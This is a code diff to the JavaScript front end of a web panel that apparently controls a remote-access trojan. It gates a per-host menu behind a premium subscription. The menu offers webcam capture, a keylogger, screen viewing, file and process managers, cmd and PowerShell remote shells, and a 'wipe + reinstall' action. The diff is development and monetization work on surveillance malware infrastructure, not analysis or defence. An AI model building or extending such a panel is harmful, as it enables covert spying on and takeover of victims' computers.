@@ -11,8 +11,6 @@ const state = {
 let pollTimer = null;
 let pollIntervalMs = 3000;
 
-let filePath = "C:\\";
-
 async function loadMe() {
   const r = await fetch('/api/me');
   if (r.status === 401) { location.href = '/signin.html'; return; }
@@ -26,6 +24,20 @@ async function loadMe() {
   $('a-mail').textContent = me.email;
   $('a-akey').textContent = me.accountKey;
   revealSetup('a-ltok', me.loginToken);
+
+  // LOCK REMOTE TAB IF NOT PREMIUM
+  if (me.premium !== 1) {
+    const remoteTab = document.querySelector('.nav a[data-tab="remote"]');
+    if (remoteTab) {
+      remoteTab.classList.add('locked');
+      remoteTab.title = "Premium required. Go to admin.html to upgrade.";
+      remoteTab.addEventListener('click', (e) => {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        alert("You need Premium to access the Remote tab.\nGo to /admin.html to upgrade.");
+      }, true);
+    }
+  }
 }
 
 function revealSetup(id, value) {
@@ -55,6 +67,7 @@ document.addEventListener('click', (e) => {
 
 document.querySelectorAll('.nav a').forEach((a) => {
   a.addEventListener('click', () => {
+    if (a.classList.contains('locked')) return;
     document.querySelectorAll('.nav a').forEach((x) => x.classList.remove('active'));
     document.querySelectorAll('.section').forEach((x) => x.classList.remove('active'));
     a.classList.add('active');
@@ -539,19 +552,30 @@ function openGearMenu(anchor, c) {
   menu.className = 'gear-menu';
   menu.style.top  = `${rect.bottom + 4}px`;
   menu.style.left = `${rect.right - 240}px`;
-  menu.innerHTML = `
-    <div class="title">${esc(c.hostname)}</div>
-    <div class="item" data-item="rdp">screen (rdp)</div>
-    <div class="item" data-item="webcam">webcam</div>
-    <div class="item" data-item="keylog">keylogger</div>
-    <div class="item" data-item="files">file manager</div>
-    <div class="item" data-item="procs">process manager</div>
-    <div class="sep"></div>
-    <div class="item" data-item="cmd">remote shell — cmd</div>
-    <div class="item" data-item="ps">remote shell — powershell</div>
-    <div class="sep"></div>
-    <div class="item" data-item="wipe" style="color:var(--red)">wipe + reinstall</div>
-  `;
+  
+  if (me.premium !== 1) {
+    menu.innerHTML = `
+      <div class="title">${esc(c.hostname)}</div>
+      <div class="item" style="color:var(--red); cursor:default;">Premium required</div>
+      <div class="sep"></div>
+      <div class="item" data-item="wipe">wipe + reinstall</div>
+    `;
+  } else {
+    menu.innerHTML = `
+      <div class="title">${esc(c.hostname)}</div>
+      <div class="item" data-item="rdp">screen (rdp)</div>
+      <div class="item" data-item="webcam">webcam</div>
+      <div class="item" data-item="keylog">keylogger</div>
+      <div class="item" data-item="files">file manager</div>
+      <div class="item" data-item="procs">process manager</div>
+      <div class="sep"></div>
+      <div class="item" data-item="cmd">remote shell — cmd</div>
+      <div class="item" data-item="ps">remote shell — powershell</div>
+      <div class="sep"></div>
+      <div class="item" data-item="wipe" style="color:var(--red)">wipe + reinstall</div>
+    `;
+  }
+
   menu.querySelectorAll('[data-item]').forEach((el) => {
     el.addEventListener('click', (ev) => {
       ev.stopPropagation();
